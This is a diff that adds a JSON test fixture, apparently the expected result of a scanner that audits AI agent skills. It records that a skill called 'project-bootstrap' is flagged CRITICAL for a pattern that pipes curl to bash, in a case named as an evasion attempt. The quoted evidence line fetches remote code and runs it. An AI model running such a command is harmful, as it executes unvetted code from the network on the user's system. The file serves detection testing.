@@ -1,0 +1,31 @@
+{
+  "skills": [
+    {
+      "skill_name": "project-bootstrap",
+      "is_safe": false,
+      "findings_count": 1,
+      "max_severity": "CRITICAL",
+      "inferred_capabilities": [
+        {
+          "resource": "shell",
+          "access": "WRITE"
+        },
+        {
+          "resource": "environment",
+          "access": "READ"
+        }
+      ],
+      "findings": [
+        {
+          "severity": "CRITICAL",
+          "message": "Remote code: curl piped to shell",
+          "attack_class": "privilege_escalation",
+          "finding_type": "pattern_match",
+          "evidence": "> curl -sL \"$_u\" | bash"
+        }
+      ]
+    }
+  ],
+  "_case": "AP04_evade_g2",
+  "_detected": true
+}
